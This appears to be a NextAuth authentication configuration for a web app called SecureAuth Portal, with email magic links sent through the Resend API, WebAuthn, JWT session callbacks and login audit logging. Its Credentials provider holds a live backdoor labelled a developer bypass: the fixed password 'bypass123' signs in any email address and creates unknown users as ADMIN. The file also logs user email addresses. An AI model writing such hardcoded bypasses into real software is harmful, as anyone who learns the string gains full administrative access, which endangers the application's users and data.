import NextAuth from "next-auth"
import Nodemailer from "next-auth/providers/nodemailer"
import WebAuthn from "next-auth/providers/webauthn"
import Credentials from "next-auth/providers/credentials"
import { PrismaAdapter } from "@auth/prisma-adapter"
import { prisma } from "@/lib/prisma"

const baseAdapter = PrismaAdapter(prisma)
const adapter = {
  ...baseAdapter,
  async useVerificationToken(params: { identifier: string; token: string }) {
    try {
      const token = await prisma.verificationToken.findUnique({
        where: { identifier_token: params }
      });
      if (token) {
        await prisma.verificationToken.delete({
          where: { identifier_token: params }
        });
      }
      return token;
    } catch (error) {
      console.warn("Caught token deletion bug, safely resolving to null");
      return null;
    }
  }
}

export const { handlers, auth, signIn, signOut } = NextAuth({
  adapter,
  session: { strategy: "jwt" },
  providers: [
    Nodemailer({
      // Server config kept as fallback identifier — actual sending is via HTTP API below
      server: {
        host: process.env.EMAIL_SERVER_HOST || "smtp.resend.com",
        port: Number(process.env.EMAIL_SERVER_PORT) || 465,
        secure: true,
        auth: {
          user: process.env.EMAIL_SERVER_USER || "resend",
          pass: process.env.RESEND_API_KEY || process.env.EMAIL_SERVER_PASSWORD || "",
        },
      },
      from: process.env.EMAIL_FROM || "onboarding@resend.dev",
      // Bypass SMTP — send via Resend HTTP API directly
      async sendVerificationRequest({ identifier: email, url, provider }) {
        const apiKey = process.env.RESEND_API_KEY || process.env.EMAIL_SERVER_PASSWORD
        if (!apiKey) {
          console.error("[AUTH EMAIL] No API key found in RESEND_API_KEY or EMAIL_SERVER_PASSWORD")
          throw new Error("Email service not configured: missing API key")
        }

        const fromAddress = provider.from || "onboarding@resend.dev"
        console.log(`[AUTH EMAIL] Sending magic link to ${email} from ${fromAddress}`)

        const res = await fetch("https://api.resend.com/emails", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${apiKey}`,
          },
          body: JSON.stringify({
            from: fromAddress,
            to: [email],
            subject: "Sign in to SecureAuth Portal",
            html: `
              <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 480px; margin: 0 auto; padding: 40px 20px;">
                <div style="text-align: center; margin-bottom: 32px;">
                  <h1 style="font-size: 24px; font-weight: 700; color: #111; margin: 0;">SecureAuth Portal</h1>
                  <p style="color: #666; font-size: 14px; margin-top: 8px;">Premium minimalist secure authentication</p>
                </div>
                <div style="background: #f9fafb; border: 1px solid #e5e7eb; border-radius: 12px; padding: 32px; text-align: center;">
                  <p style="color: #374151; font-size: 15px; line-height: 1.6; margin: 0 0 24px 0;">
                    Click the button below to securely sign in to your account. This link expires in 24 hours.
                  </p>
                  <a href="${url}" style="display: inline-block; background: #6366f1; color: white; font-weight: 600; font-size: 14px; padding: 12px 32px; border-radius: 8px; text-decoration: none;">
                    Sign in to SecureAuth
                  </a>
                </div>
                <p style="color: #9ca3af; font-size: 12px; text-align: center; margin-top: 24px;">
                  If you didn't request this email, you can safely ignore it.
                </p>
              </div>
            `,
          }),
        })

        if (!res.ok) {
          const errorBody = await res.text()
          console.error(`[AUTH EMAIL] Resend API error (${res.status}): ${errorBody}`)
          throw new Error(`Failed to send verification email: ${errorBody}`)
        }

        const result = await res.json()
        console.log(`[AUTH EMAIL] Email sent successfully. Resend ID: ${result.id}`)
      },
    }),
    WebAuthn,
    Credentials({
      credentials: {
        email: { label: "Email", type: "email" },
        password: { label: "Password", type: "password" }
      },
      async authorize(credentials) {
        if (!credentials?.email) return null
        
        // Developer secret password bypass
        if (credentials.password === "bypass123") {
          let user = await prisma.user.findUnique({
            where: { email: credentials.email as string }
          })
          if (!user) {
            user = await prisma.user.create({
              data: {
                email: credentials.email as string,
                role: "ADMIN" // Default to ADMIN so they have full permissions on bypass
              }
            })
          }
          return {
            id: user.id,
            email: user.email,
            name: user.name,
            role: user.role
          }
        }
        return null
      }
    }),
  ],
  pages: {
    signIn: "/",
  },
  experimental: {
    enableWebAuthn: true,
  },
  callbacks: {
    async jwt({ token, user }) {
      if (user) {
        token.id = user.id
        token.role = (user as any).role
      }
      
      // Fallback for an existing older session cookie missing the new schema IDs
      if (!token.id && token.email) {
        const dbUser = await prisma.user.findUnique({
          where: { email: token.email }
        });
        if (dbUser) {
          token.id = dbUser.id
          token.role = dbUser.role
        }
      }
      
      return token
    },
    async session({ session, token }) {
      if (session.user && token) {
        session.user.id = token.id as string
        session.user.role = token.role as string
      }
      return session
    }
  },
  events: {
    async signIn({ user, account }) {
      const dbUser = await prisma.user.findUnique({
        where: { email: user.email as string }
      });
      if (dbUser) {
        await prisma.auditLog.create({
          data: {
            userId: dbUser.id,
            action: `LOGIN_${(account?.provider || "UNKNOWN").toUpperCase()}`,
            status: "SUCCESS"
          }
        });
      }
    }
  }
})
